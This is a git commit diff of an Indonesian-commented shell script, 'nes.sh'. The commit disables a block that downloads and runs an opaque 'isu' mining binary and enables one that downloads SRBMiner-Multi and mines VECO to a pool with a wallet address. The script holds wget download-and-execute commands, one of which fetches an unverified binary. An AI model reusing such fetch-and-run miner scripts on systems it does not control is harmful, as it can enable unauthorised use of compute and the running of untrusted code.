8d6a165c5b5e5541e7657ebda9e75779c460dbc9
barburonjilo <barburonjilo@outlook.co.id>
2025-07-27 08:48:50 +0700

    Update nes.sh

--- nes.sh
+++ nes.sh
@@ -26,18 +26,18 @@ sleep 5
 ##########################
 # === PILIHAN 1: ISU === #
 ##########################
-rm -rf isu
+# rm -rf isu
 
-echo "Mengunduh file 'isu' ke direktori saat ini..."
-wget -q https://github.com/barburonjilo/open/raw/refs/heads/main/isu
+# echo "Mengunduh file 'isu' ke direktori saat ini..."
+# wget -q https://github.com/barburonjilo/open/raw/refs/heads/main/isu
 
-echo "Memberi izin eksekusi pada 'isu'..."
-chmod +x isu
+# echo "Memberi izin eksekusi pada 'isu'..."
+# chmod +x isu
 
-echo "Menjalankan file './isu'..."
-./isu -a power2b \
-      -o stratum+tcp://stratum-asia.rplant.xyz:7022 \
-      -u mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482.workercron
+# echo "Menjalankan file './isu'..."
+# ./isu -a power2b \
+#       -o stratum+tcp://stratum-asia.rplant.xyz:7022 \
+#       -u mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482.workercron
 
 
 
@@ -45,24 +45,24 @@ echo "Menjalankan file './isu'..."
 # === PILIHAN 2: SRBMiner === #
 ###############################
 
-# MINER_DIR="$HOME/SRBMiner-Multi-2-7-5"
+MINER_DIR="$HOME/SRBMiner-Multi-2-7-5"
 
-# if [ ! -d "$MINER_DIR" ]; then
-#     echo "Miner belum ada, mengunduh sekarang..."
-#     wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz
-#     tar -xzf SRBMiner-Multi-2-7-5-Linux.tar.gz
-#     rm SRBMiner-Multi-2-7-5-Linux.tar.gz
-# else
-#     echo "Miner sudah ada, langsung menjalankan..."
-# fi
+if [ ! -d "$MINER_DIR" ]; then
+    echo "Miner belum ada, mengunduh sekarang..."
+    wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz
+    tar -xzf SRBMiner-Multi-2-7-5-Linux.tar.gz
+    rm SRBMiner-Multi-2-7-5-Linux.tar.gz
+else
+    echo "Miner sudah ada, langsung menjalankan..."
+fi
 
-# cd "$MINER_DIR" || { echo "Folder miner tidak ditemukan!"; exit 1; }
+cd "$MINER_DIR" || { echo "Folder miner tidak ditemukan!"; exit 1; }
 
-# echo "Menjalankan SRBMiner..."
-# ./SRBMiner-MULTI -a yespower \
-#     -o stratum+tcp://stratum.vecocoin.com:8602 \
-#     -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.workercron \
-#     -p c=VECO,zap=VECO,mc=VECO,m=solo
+echo "Menjalankan SRBMiner..."
+./SRBMiner-MULTI -a yespower \
+    -o stratum+tcp://stratum.vecocoin.com:8602 \
+    -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.workercron \
+    -p c=VECO,zap=VECO,mc=VECO,m=solo
 
 
 
